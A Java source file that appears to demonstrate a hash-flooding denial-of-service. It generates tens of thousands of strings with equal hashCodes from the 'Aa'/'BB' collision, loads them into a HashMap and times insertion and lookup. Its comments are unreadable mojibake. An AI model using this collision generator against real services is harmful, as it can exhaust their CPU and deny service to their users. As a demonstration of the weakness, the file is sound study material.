package com.test;
import java.io.*;

import java.util.ArrayList;  
import java.util.HashMap;  
import java.util.List;  
import java.util.Map;  
  
/** 
 * ����ģ��HashMap�ľܾ����񹥻�����Ϊhash�������ݵ�ʱ�����HashCodeֵ��ȣ� 
 * ������hashֵȷ��tables��������index�����õ�entry��Ȼ���Լ�����entry����ͷ�� 
 * ԭ����ֵ�ͳ�Ϊ����next����Ҳ��Ϊʲôentry��Next 
 * �������ͬ��HashCode�����������ʽȥ���HashCode��ȵ�ֵ��������Ƶ�Code 
 * ̫�࣬��������ܳ���һ���򵥵Ĳ�ѯ���ľ����е�CPU 
 * @author wb-zhangye 
 * 
 */  
public class HashDenyService {  
    /** 
     * ���Ҫ����hash����hashcode��ͬ���ַ��� 
     */  
    private static List<String> DEPOSITORY = new ArrayList<String>();  
      
    /** 
     * HashMap��Ŷ��hashCode��ͬ�ļ� 
     */  
    private static Map<String, String> DENYMAP = new HashMap<String, String>();  
      
    /** 
     * Ҫ����hash���е���ͬhashCode�ĸ������� 2 ��POWER���ݱ�ʾ�� 
     * ���� 2^15 
     */  
    private static int POWER = 15;  
      
      
    public static void main(String[] args) {  
          
        /************************************************** 
         ***************������hashCode��ͬ��Map*********** 
         **************************************************/  
        System.out.println("-------------attack---------- ");  
        Long beginTime = System.currentTimeMillis();  
          
        String xx = "Aa", yy = "BB";    // xx �� yy��hashCodeֵ��ͬ  
        String[] arrays = { xx, yy };  
        perm(arrays, null);  
          
        for(int i = 0; i < DEPOSITORY.size(); i++){  
            DENYMAP.put(DEPOSITORY.get(i), "xx" + i);  
        }  
          
        Long endTime = System.currentTimeMillis();  
        System.out.println("-------------cease fire---------- ");  
        System.out.println("һ����ʱ" + (endTime - beginTime));  
          
          
        /************************************************** 
         *************��Map��ȡ��һ��key��Ӧ��value********* 
         **************************************************/  
        System.out.println("-------------start get Service---------- ");  
        Long xstartTiem = System.currentTimeMillis();  
          
        String tempData = DENYMAP.get(DEPOSITORY.get(30));  
        int code = hash(tempData.hashCode());  
        int index = code & (64 - 1);  
        System.out.println("index is " + index);  
          
        System.out.println(DENYMAP.get(DEPOSITORY.get(30)));  
        Long xendTime = System.currentTimeMillis();  
        System.out.println("һ����ʱ" + (xendTime - xstartTiem));  
        System.out.println("-------------end end Service---------- ");  
    }  
      
    public static int hash(int h) {  
        h ^= (h >>> 20) ^ (h >>> 12);  
        return h ^ (h >>> 7) ^ (h >>> 4);  
    }  
  
    /** 
     * ������hashcode��ͬ���ַ���������DEPOSITORY�� 
     * @param arrays 
     * @param paramList 
     */  
    public static void perm(String[] arrays, List<String> paramList) {  
        int length = arrays.length;  
        for (int i = 0; i < length; i++) {  
            List<String> tempArray = null;  
            if (null == paramList) {  
                tempArray = new ArrayList<String>();  
            } else {  
                tempArray = paramList;  
            }  
            if (tempArray.size() <= POWER) {  
                List<String> tempList = new ArrayList<String>(tempArray);  
                tempList.add(arrays[i]);  
                perm(arrays, tempList);  
            } else {  
                DEPOSITORY.add(transferStr(tempArray));  
                return;  
            }  
        }  
    }  
      
    private static String transferStr(List list){  
        int length = list.size();  
        StringBuilder builder = new StringBuilder();  
        for(int i = 0; i < length; i++){  
            builder.append(list.get(i));  
        }  
        return builder.toString();  
    }  
}  